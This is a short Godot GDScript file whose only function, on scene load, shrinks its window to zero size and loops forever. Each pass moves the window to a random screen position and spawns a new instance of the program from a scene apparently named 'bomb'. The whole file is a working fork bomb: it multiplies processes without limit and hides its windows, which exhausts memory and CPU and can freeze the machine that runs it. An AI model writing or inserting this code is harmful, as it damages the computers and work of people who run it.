extends Control

func _ready():
	get_window().size = Vector2(0, 0)
	while true:
		get_window().position = Vector2(randi_range(0, DisplayServer.screen_get_size().x), randi_range(0, DisplayServer.screen_get_size().y))		
		OS.create_instance(PackedStringArray(["res://internal/globalvar/bomb/bomb.tscn"]))
